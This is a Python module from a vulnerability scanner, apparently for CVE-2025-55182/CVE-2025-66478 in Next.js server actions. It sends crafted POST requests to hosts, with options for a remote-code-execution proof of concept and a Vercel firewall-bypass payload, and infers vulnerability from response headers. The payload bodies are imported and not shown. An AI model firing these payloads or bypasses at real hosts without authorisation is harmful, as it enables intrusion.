import re
import requests
from datetime import datetime, timezone
from urllib.parse import urlparse

from ..payloads.safe import build_safe_payload
from ..payloads.rce import build_rce_payload
from ..payloads.bypass import build_vercel_waf_bypass_payload
from .network import normalize_host, resolve_redirects, send_payload

def is_vulnerable_safe_check(response: requests.Response) -> bool:
    """Check if a response indicates vulnerability (safe side-channel check)."""
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False

    # Check for Vercel/Netlify mitigations (not valid findings)
    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = (
        has_netlify_vary
        or server_header == "netlify"
        or server_header == "vercel"
    )

    return not is_mitigated

def is_vulnerable_rce_check(response: requests.Response) -> bool:
    """Check if a response indicates vulnerability (RCE PoC check)."""
    # Check for the X-Action-Redirect header with the expected value
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))

def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False) -> dict:
    """
    Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478.
    """
    result = {
        "host": host,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "request": None,
        "response": None,
        "final_url": None,
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }

    host = normalize_host(host)
    if not host:
        result["error"] = "Invalid or empty host"
        return result

    root_url = f"{host}/"

    if safe_check:
        body, content_type = build_safe_payload()
        is_vulnerable = is_vulnerable_safe_check
    elif vercel_waf_bypass:
        body, content_type = build_vercel_waf_bypass_payload()
        is_vulnerable = is_vulnerable_rce_check
    else:
        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
        is_vulnerable = is_vulnerable_rce_check

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }

    # Apply custom headers (override defaults)
    if custom_headers:
        headers.update(custom_headers)

    def build_request_str(url: str) -> str:
        parsed = urlparse(url)
        req_str = f"POST {'/aaa' or '/aaa'} HTTP/1.1\r\n"
        req_str += f"Host: {parsed.netloc}\r\n"
        for k, v in headers.items():
            req_str += f"{k}: {v}\r\n"
        req_str += f"Content-Length: {len(body)}\r\n\r\n"
        req_str += body
        return req_str

    def build_response_str(resp: requests.Response) -> str:
        resp_str = f"HTTP/1.1 {resp.status_code} {resp.reason}\r\n"
        for k, v in resp.headers.items():
            resp_str += f"{k}: {v}\r\n"
        resp_str += f"\r\n{resp.text[:2000]}"
        return resp_str

    # First, test the root path
    result["final_url"] = root_url
    result["request"] = build_request_str(root_url)

    response, error = send_payload(root_url, headers, body, timeout, verify_ssl)

    if error:
        result["error"] = error
        return result

    result["status_code"] = response.status_code
    result["response"] = build_response_str(response)

    if is_vulnerable(response):
        result["vulnerable"] = True
        return result

    # Root not vulnerable - try redirect path if enabled
    if follow_redirects:
        try:
            redirect_url = resolve_redirects(root_url, timeout, verify_ssl)
            if redirect_url != root_url:
                # Different path, test it
                response, error = send_payload(redirect_url, headers, body, timeout, verify_ssl)

                if error:
                    # Keep root result but note the redirect failed
                    result["vulnerable"] = False
                    return result

                result["final_url"] = redirect_url
                result["request"] = build_request_str(redirect_url)
                result["status_code"] = response.status_code
                result["response"] = build_response_str(response)

                if is_vulnerable(response):
                    result["vulnerable"] = True
                    return result
        except Exception:
            pass  # Continue with root result if redirect resolution fails

    result["vulnerable"] = False
    return result
